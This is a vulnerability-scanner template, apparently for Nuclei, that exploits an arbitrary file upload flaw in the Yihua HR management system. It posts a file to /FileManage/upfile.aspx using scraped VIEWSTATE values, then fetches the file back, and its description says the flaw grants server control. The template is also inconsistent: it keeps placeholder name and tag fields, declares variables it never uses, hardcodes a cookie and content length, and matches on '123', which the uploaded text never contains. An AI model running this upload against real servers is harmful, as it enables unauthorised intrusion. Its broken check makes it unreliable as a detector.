id: yihuarenliziyuan-FileManage-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 亿华人力资源管理系统是一款全面的人力资源管理软件，旨在帮助企业实现员工档案管理规范化、薪资管理自动化、招聘管理流程化等目标。该系统涵盖了人力资源管理的各个方面，包括员工档案管理、薪资管理、招聘管理、培训管理、福利管理等。亿华人力资源管理系统upfile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。
  tags: tags
variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(8)}}"
http:
  - raw:
      - |+
        GET /FileManage/upfile.aspx HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /FileManage/upfile.aspx HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 44309
        Cache-Control: max-age=0
        Accept-Language: zh-CN,zh;q=0.9
        Origin: http://{{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarybeK1CDpONaOzMpTw
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (X11; Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6793.72 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Referer: http://{{Hostname}}/FileManage/upfile.aspx
        Accept-Encoding: gzip, deflate, br
        Cookie: ASP.NET_SessionId=kmt5gfkduotu42fbyoychrjt
        sec-ch-ua-platform: "Linux"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="131", "Google Chrome";v="131"
        sec-ch-ua-mobile: ?0
        Connection: close

        ------WebKitFormBoundarybeK1CDpONaOzMpTw
        Content-Disposition: form-data; name="__VIEWSTATE"

        {{VIEWSTATE}}
        ------WebKitFormBoundarybeK1CDpONaOzMpTw
        Content-Disposition: form-data; name="__VIEWSTATEGENERATOR"

        {{VIEWSTATEGENERATOR}}
        ------WebKitFormBoundarybeK1CDpONaOzMpTw
        Content-Disposition: form-data; name="File"; filename="1.txt"
        Content-Type: image/jpeg

        whoisceshi
        ------WebKitFormBoundarybeK1CDpONaOzMpTw
        Content-Disposition: form-data; name="UploadButton"

        开始上传
        ------WebKitFormBoundarybeK1CDpONaOzMpTw--
      - |+
        GET //FilesUpload/1.txt HTTP/1.1
        Host: {{Hostname}}
    extractors:
      - type: regex
        name: VIEWSTATE
        group: 1
        regex:
           - 'id="__VIEWSTATE" value="(\S*)"'
        internal: true
      - type: regex
        name: VIEWSTATEGENERATOR
        group: 1
        regex:
           - 'id="__VIEWSTATEGENERATOR" value="(\S*)"'
        internal: true
        
    matchers:
      - type: word
        part: body
        words:
          - '123'
